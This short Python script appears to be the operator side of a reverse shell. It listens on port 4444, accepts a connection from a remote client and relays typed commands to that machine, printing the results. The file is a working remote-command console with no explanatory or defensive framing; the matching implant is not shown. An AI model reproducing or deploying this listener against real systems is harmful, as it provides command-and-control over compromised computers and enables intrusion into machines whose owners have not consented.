#!/usr/bin/python
# General - Connection to the client, able to send and recieve data. Testing on port 4444


import socket

listr = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
# The bellow is to reuse a connection if it doesn't go down with the connection to.
listr.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
listr.bind(("", 4444))
listr.listen(0)
print("\n[+] Waiting for incoming connection.\n")
conn, addrs = listr.accept()
print("[+] Got a connection from " + str(addrs) + "\n")

while True:
    comm = input('=[ $ ')
    if "exit" in comm:
        break
    conn.send(comm.encode())
    rslt = conn.recv(1024)
    print(rslt.decode())

conn.close()